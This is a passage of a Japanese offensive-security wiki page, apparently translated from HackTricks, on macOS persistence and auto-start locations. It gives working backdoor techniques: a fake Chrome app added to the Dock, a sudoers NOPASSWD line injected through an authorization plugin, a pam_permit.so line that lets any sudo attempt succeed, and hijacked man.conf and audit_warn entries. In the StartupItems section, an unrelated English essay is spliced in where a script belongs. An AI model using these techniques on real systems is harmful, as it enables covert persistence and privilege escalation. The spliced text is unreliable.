フォルダアクションを設定する方法には、次のようなオプションがあります:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)を使用してフォルダアクションワークフローを作成し、サービスとしてインストールする。
2. フォルダのコンテキストメニュー内のフォルダアクション設定を介してスクリプトを手動で添付する。
3. プログラムでフォルダアクションを設定するために`System Events.app`にApple Eventメッセージを送信するためにOSAScriptを利用する。
* この方法は、アクションをシステムに埋め込んで持続性を提供するのに特に便利です。

以下のスクリプトは、フォルダアクションで実行できる例です:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
上記のスクリプトをフォルダアクションで使用可能にするには、次のようにコンパイルしてください：
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトがコンパイルされた後、以下のスクリプトを実行してフォルダアクションを設定します。このスクリプトはフォルダアクションをグローバルに有効にし、事前にコンパイルされたスクリプトをデスクトップフォルダに特定の添付します。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
次のコマンドでセットアップスクリプトを実行します：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* これはGUIを介してこの永続性を実装する方法です：

これが実行されるスクリプトです：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
その後、`Folder Actions Setup`アプリを開き、**監視したいフォルダ**を選択し、あなたの場合は**`folder.scpt`**を選択します（私の場合はoutput2.scpと呼びました）：

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder**でそのフォルダを開くと、スクリプトが実行されます。

この設定は、**base64形式**で`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`に保存されています。

次に、GUIアクセスなしでこの永続性を準備しよう：

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**をバックアップするために`/tmp`にコピーします：
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. さっき設定したフォルダアクションを**削除**します：

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

これで空の環境ができました

3. バックアップファイルをコピーします：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. この設定を適用するためにFolder Actions Setup.appを開きます：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
私にはうまくいきませんでしたが、これがライートアップからの指示です:(
{% endhint %}

### Dockショートカット

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
* ただし、システム内に悪意のあるアプリケーションをインストールしている必要があります
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `~/Library/Preferences/com.apple.dock.plist`
* **トリガー**: ユーザーがDock内のアプリをクリックしたとき

#### 説明と悪用

Dockに表示されるすべてのアプリケーションは、**`~/Library/Preferences/com.apple.dock.plist`**内で指定されています。

**アプリケーションを追加**することが可能です：

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

**ソーシャルエンジニアリング**を使用すると、ドック内で**Google Chromeを装った**ように見せかけて、実際に自分のスクリプトを実行することができます。
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### カラーピッカー

解説: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* 非常に特定のアクションが必要
* 別のサンドボックスに入ることになる
* TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `/Library/ColorPickers`
* ルート権限が必要
* トリガー: カラーピッカーを使用する
* `~/Library/ColorPickers`
* トリガー: カラーピッカーを使用する

#### 説明とエクスプロイト

**コードと一緒にカラーピッカー**バンドルをコンパイルします（例: [**こちらを使用できます**](https://github.com/viktorstrate/color-picker-plus)）そしてコンストラクタを追加します（[スクリーンセーバーセクション](macos-auto-start-locations.md#screen-saver)のように）バンドルを`~/Library/ColorPickers`にコピーします。

その後、カラーピッカーがトリガーされると、あなたのコードも実行されるはずです。

あなたのライブラリをロードするバイナリには**非常に制限の厳しいサンドボックス**があることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**解説**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**解説**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* サンドボックスをバイパスするのに役立つ: **いいえ、独自のアプリを実行する必要があるため**
* TCCバイパス: ???

#### 位置

* 特定のアプリ

#### 説明とエクスプロイト

Finder Sync Extensionを持つアプリケーションの例は[**こちらで見つけることができます**](https://github.com/D00MFist/InSync)。

アプリケーションには`Finder Sync Extensions`を持つことができます。この拡張機能は、実行されるアプリケーション内に配置されます。さらに、拡張機能がコードを実行できるようにするには、いくつかの有効なApple開発者証明書で**署名されている必要があり**、**サンドボックス化**されている必要があります（緩和された例外が追加される可能性があります）、そして次のようなものに登録されている必要があります:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、一般的なアプリケーションサンドボックスに入る
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### ロケーション

* `/System/Library/Screen Savers`
* ルート権限が必要
* **トリガー**: スクリーンセーバーを選択
* `/Library/Screen Savers`
* ルート権限が必要
* **トリガー**: スクリーンセーバーを選択
* `~/Library/Screen Savers`
* **トリガー**: スクリーンセーバーを選択

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明とエクスプロイト

Xcodeで新しいプロジェクトを作成し、新しい**スクリーンセーバー**を生成するためのテンプレートを選択します。次に、例えば以下のコードを追加してログを生成します。

**ビルド**し、`.saver`バンドルを**`~/Library/Screen Savers`**にコピーします。その後、スクリーンセーバーGUIを開き、それをクリックするだけで多くのログが生成されるはずです:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
このコードをロードするバイナリの権限（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）の中に **`com.apple.security.app-sandbox`** があるため、**一般的なアプリケーションサンドボックス内に**いることに注意してください。
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* 便利なサンドボックス回避に使用: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、アプリケーションのサンドボックスに入ることになります
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
* サンドボックスは非常に制限されています

#### 位置

* `~/Library/Spotlight/`
* **トリガー**: スポットライトプラグインで管理される拡張子の新しいファイルが作成されます。
* `/Library/Spotlight/`
* **トリガー**: スポットライトプラグインで管理される拡張子の新しいファイルが作成されます。
* ルート権限が必要
* `/System/Library/Spotlight/`
* **トリガー**: スポットライトプラグインで管理される拡張子の新しいファイルが作成されます。
* ルート権限が必要
* `Some.app/Contents/Library/Spotlight/`
* **トリガー**: スポットライトプラグインで管理される拡張子の新しいファイルが作成されます。
* 新しいアプリが必要

#### 説明と悪用

SpotlightはmacOSの組み込み検索機能で、ユーザーに**コンピュータ上のデータへの迅速かつ包括的なアクセス**を提供するよう設計されています。\
この迅速な検索機能を可能にするために、Spotlightは**独自のデータベース**を維持し、ほとんどのファイルを解析してインデックスを作成し、ファイル名とその内容の両方を素早く検索できるようにします。

Spotlightの基本メカニズムには、'mds'という中央プロセスが関与しており、これは**'メタデータサーバ'**の略称です。このプロセスはSpotlightサービス全体を統括します。これに加えて、異なるファイルタイプをインデックス化するなどのさまざまなメンテナンスタスクを実行する複数の'mdworker'デーモンが存在します（`ps -ef | grep mdworker`）。これらのタスクは、Spotlightインポータープラグインまたは**".mdimporterバンドル**"によって可能にされ、Spotlightがさまざまなファイル形式全体のコンテンツを理解してインデックス化できるようにします。

プラグインまたは**`.mdimporter`**バンドルは以前に言及された場所にあり、新しいバンドルが現れるとすぐにロードされます（サービスの再起動は不要）。これらのバンドルは、管理できる**ファイルタイプと拡張子を示さなければならず**、このようにして、指定された拡張子の新しいファイルが作成されるとSpotlightがそれらを使用します。

すべての**`mdimporters`**を見つけることができます。実行中:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
そして例えば**/Library/Spotlight/iBooksAuthor.mdimporter**は、これらの種類のファイル（拡張子`.iba`および`.book`など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
他の`mdimporter`のPlistをチェックすると、**`UTTypeConformsTo`**エントリが見つからないことがあります。これは組み込みの_Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier))であり、拡張子を指定する必要がないためです。

さらに、システムのデフォルトプラグインが常に優先されるため、攻撃者はAppleの独自の`mdimporters`によってインデックス付けされていないファイルにのみアクセスできます。
{% endhint %}

独自のインポータを作成するには、このプロジェクトから始めることができます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer)、そして名前を変更し、**`CFBundleDocumentTypes`**を変更し、**`UTImportedTypeDeclarations`**を追加して、サポートしたい拡張子をサポートし、**`schema.xml`**でそれらを反映させます。\
その後、**`GetMetadataForFile`**関数のコードを変更して、処理された拡張子を持つファイルが作成されたときにペイロードを実行するようにします。

最後に、新しい`.mdimporter`をビルドしてコピーし、以前のいずれかの場所に配置し、**ログを監視**するか、**`mdimport -L`**をチェックしてロードされているかどうかを確認できます。

### ~~Preference Pane~~

{% hint style="danger" %}
これはもう機能していないようです。
{% endhint %}

解説: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* サンドボックス回避に便利: [🟠](https://emojipedia.org/large-orange-circle)
* 特定のユーザーアクションが必要です
* TCC回避: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### 説明

これはもう機能していないようです。

## Root Sandbox Bypass

{% hint style="success" %}
ここでは、**サンドボックス回避**に役立つ**開始位置**を見つけることができます。これにより、**ファイルに書き込むことで**単純に何かを実行できます。**root**であることや他の**奇妙な条件**が必要です。
{% endhint %}

### 定期的

解説: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* サンドボックス回避に便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があります
* TCC回避: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* root権限が必要
* **トリガー**: 時間が来たとき
* `/etc/daily.local`, `/etc/weekly.local`または`/etc/monthly.local`
* root権限が必要
* **トリガー**: 時間が来たとき

#### 説明と悪用

定期スクリプト(**`/etc/periodic`**)は、`/System/Library/LaunchDaemons/com.apple.periodic*`で構成された**ランチデーモン**によって実行されます。`/etc/periodic/`に保存されたスクリプトはファイルの所有者として**実行**されるため、潜在的な特権昇格には機能しません。
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

**`/etc/defaults/periodic.conf`**に記載されている実行される他の定期スクリプトがあります:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`、`/etc/weekly.local`、または`/etc/monthly.local`のいずれかのファイルを書き換えることができれば、**sooner or later実行されます**。

{% hint style="warning" %}
定期スクリプトは**スクリプトの所有者として実行**されます。したがって、通常のユーザーがスクリプトの所有者である場合、そのユーザーとして実行されます（これにより特権昇格攻撃が防止される可能性があります）。
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があります
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* 常にRootが必要

#### 説明と悪用

PAMはmacOS内での簡単な実行よりも**持続性**とマルウェアに焦点を当てているため、このブログではこのテクニックをよりよく理解するために詳細な説明は行いません。
```bash
ls -l /etc/pam.d
```
永続性/特権昇格テクニックは、PAMを悪用することで簡単に行うことができます。/etc/pam.d/sudoモジュールを変更し、冒頭に次の行を追加するだけです:
```bash
auth       sufficient     pam_permit.so
```
したがって、それは次のように**見える**でしょう：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
そしてしたがって、**`sudo`を使用しようとする試みはすべて成功します**。

{% hint style="danger" %}
このディレクトリはTCCによって保護されているため、ユーザーにアクセスを求めるプロンプトが表示される可能性が非常に高いことに注意してください。
{% endhint %}

### 認可プラグイン

解説: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
解説: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があり、追加の設定が必要です
* TCCバイパス: ???

#### 位置

* `/Library/Security/SecurityAgentPlugins/`
* root権限が必要
* プラグインを使用するために認可データベースを構成する必要があります

#### 説明と悪用

ユーザーがログインするときに実行される認可プラグインを作成して、持続性を維持できます。これらのプラグインの作成方法についての詳細は、以前の解説を確認してください（悪く書かれたプラグインはロックアウトの原因となり、回復モードからMacをクリーンアップする必要があります）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**バンドル**をロードされる場所に移動してください:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、このプラグインをロードする**ルール**を追加してください。
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**は、認可フレームワークに、**認可のために外部メカニズムを呼び出す必要がある**ことを伝えます。さらに、**`privileged`**は、それをrootによって実行されるようにします。

以下のようにトリガーします：
```bash
security authorize com.asdf.asdf
```
そして、**スタッフグループにはsudoアクセス権**が必要です（`/etc/sudoers`を読んで確認してください）。

### Man.conf

解説: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があり、ユーザーはmanを使用する必要があります
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/private/etc/man.conf`**
* root権限が必要
* **`/private/etc/man.conf`**: manが使用されるたび

#### 説明とエクスプロイト

設定ファイル**`/private/etc/man.conf`**は、manドキュメントファイルを開く際に使用するバイナリ/スクリプトを示しています。したがって、実行可能ファイルへのパスを変更すると、ユーザーがmanを使用してドキュメントを読むたびにバックドアが実行される可能性があります。

例えば、**`/private/etc/man.conf`**に設定されています:
```
MANPAGER /tmp/view
```
その後、`/tmp/view`を次のように作成します：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**解説**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があり、apacheが実行されている必要がある
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
* Httpdには権限がない

#### 位置

* **`/etc/apache2/httpd.conf`**
* root権限が必要
* トリガー: Apache2が起動したとき

#### 説明とエクスプロイト

`/etc/apache2/httpd.conf` にモジュールをロードするよう指示することができます。次のような行を追加します:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

これにより、コンパイルされたモジュールがApacheによってロードされます。唯一の注意点は、**有効なApple証明書で署名する**か、システムに**新しい信頼された証明書を追加**して**それで署名する**必要があることです。

その後、サーバーが起動することを確認するために必要な場合は、次のコマンドを実行できます:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
コード例はDylb：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM監査フレームワーク

解説: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
* ただし、rootである必要があり、auditdが実行されている必要があり、警告を引き起こす必要がある
* TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

* **`/etc/security/audit_warn`**
* root権限が必要
* **トリガー**: auditdが警告を検出したとき

#### 説明とエクスプロイト

auditdが警告を検出すると、スクリプト **`/etc/security/audit_warn`** が **実行** されます。したがって、そこにペイロードを追加できます。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
### スタートアップアイテム

{% hint style="danger" %}
**これは非推奨ですので、これらのディレクトリには何も見つかるべきではありません。**
{% endhint %}

**StartupItem** は、`/Library/StartupItems/` または `/System/Library/StartupItems/` のいずれかに配置する必要があるディレクトリです。このディレクトリが確立されると、次の2つの特定のファイルを含める必要があります。

1. **rc スクリプト**：起動時に実行されるシェルスクリプト。
2. **plist ファイル**：`StartupParameters.plist` という名前のファイルで、さまざまな構成設定を含みます。

スタートアッププロセスがこれらを認識して利用するために、rc スクリプトと `StartupParameters.plist` ファイルが正しく **StartupItem** ディレクトリ内に配置されていることを確認してください。

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}  

macOS Auto Start Locations
==========================

macOS provides several locations where programs can be configured to automatically start when a user logs in. These auto-start locations can be leveraged by malware to maintain persistence on a system. It is important to regularly review and monitor these locations to ensure only legitimate programs are set to auto-start.

### User-Level Auto-Start Locations

1. **Login Items**: Located in System Preferences > Users & Groups > Login Items, this is the most common location where users can configure programs to auto-start at login.

2. **Launch Agents**: Located in `~/Library/LaunchAgents`, these are used to launch programs when a user logs in. Malware can install launch agents to achieve persistence.

3. **Launch Daemons**: Located in `/Library/LaunchDaemons`, these are system-wide launch agents that execute with elevated privileges. Malware may abuse this location for persistence.

### System-Level Auto-Start Locations

1. **Startup Items**: Located in `/Library/StartupItems`, these were used in older versions of macOS but are deprecated in macOS 10.11 and later.

2. **Launch Daemons**: Located in `/Library/LaunchDaemons`, these system-wide launch agents execute with elevated privileges.

3. **Startup Daemons**: Located in `/System/Library/LaunchDaemons`, these are launch daemons that are critical for the system to boot up properly.

By monitoring and reviewing these auto-start locations, users can detect and remove any unauthorized or malicious programs that may be configured to auto-start on their macOS system.  
{% endtab %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
### ~~emond~~

{% hint style="danger" %}
私のmacOSではこのコンポーネントを見つけることができませんので、詳細についてはwriteupをチェックしてください
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Appleによって導入された**emond**は、開発が不十分であるか、おそらく放棄されているように見えますが、アクセス可能なままです。Mac管理者にとって特に有益ではありませんが、この不明瞭なサービスは、脅威アクターにとって微妙な持続性手法として機能する可能性があり、おそらくほとんどのmacOS管理者には気付かれないでしょう。

その存在を認識している人にとって、**emond**の悪用を特定することは簡単です。このサービスのLaunchDaemonは、実行するスクリプトを単一のディレクトリで探します。これを調査するために、次のコマンドを使用できます:
```bash
ls -l /private/var/db/emondClients
```
### XQuartz

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### ロケーション

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* ルート権限が必要
* **トリガー**: XQuartzを使用する場合

#### 説明とエクスプロイト

XQuartzは**もはやmacOSにインストールされていません**ので、詳細についてはライトアップをチェックしてください。

### kext

{% hint style="danger" %}
ルートとしてさえkextをインストールするのは非常に複雑なので、サンドボックスから脱出するためや持続性のためにこれを考慮しないでしょう（エクスプロイトがある場合を除く）
{% endhint %}

#### ロケーション

KEXTを起動アイテムとしてインストールするには、次のいずれかの場所に**インストールする必要があります**:

* `/System/Library/Extensions`
* OS Xオペレーティングシステムに組み込まれたKEXTファイル。
* `/Library/Extensions`
